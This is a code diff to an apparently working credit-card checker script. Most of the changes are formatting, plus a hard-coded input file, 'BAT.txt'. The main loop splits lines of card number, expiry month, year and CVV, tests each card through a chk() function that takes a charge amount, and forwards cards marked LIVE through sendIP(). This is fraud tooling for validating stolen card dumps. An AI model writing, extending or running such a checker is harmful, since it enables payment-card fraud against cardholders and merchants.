@@ -144,24 +144,25 @@ def chk(cc, mon, year, cvv, charge="1"):
     return f"DEAD ~ IP: {ip} ~ Time Taken: {takenTime}"
 
 def readFile(filename):
-    s=""
+    s = ""
     with open(filename, "r") as f:
-        tmp=f.readlines()
+        tmp = f.readlines()
         for u in tmp:
-            s=s+u
+            s = s + u
     return s.split("\n")
 
+
 def main():
-    f=input("Enter File Name:")
-    CCS=readFile(f)
+    filename = "BAT.txt"  # Replace "filename.txt" with your actual filename
+    CCS = readFile(filename)
     for CC in CCS:
         try:
-            temp=CC.split("|")
-            ccn=temp[0]
-            m=temp[1]
-            y=temp[2]
-            cvv=temp[3]
-            msg=chk(ccn, m, y, cvv)
+            temp = CC.split("|")
+            ccn = temp[0]
+            m = temp[1]
+            y = temp[2]
+            cvv = temp[3]
+            msg = chk(ccn, m, y, cvv)
             if "LIVE" in msg:
                 sendIP(msg)
             print(CC)
@@ -173,4 +174,5 @@ def main():
             print("ERROR")
             print(e)
             pass
+
 main()
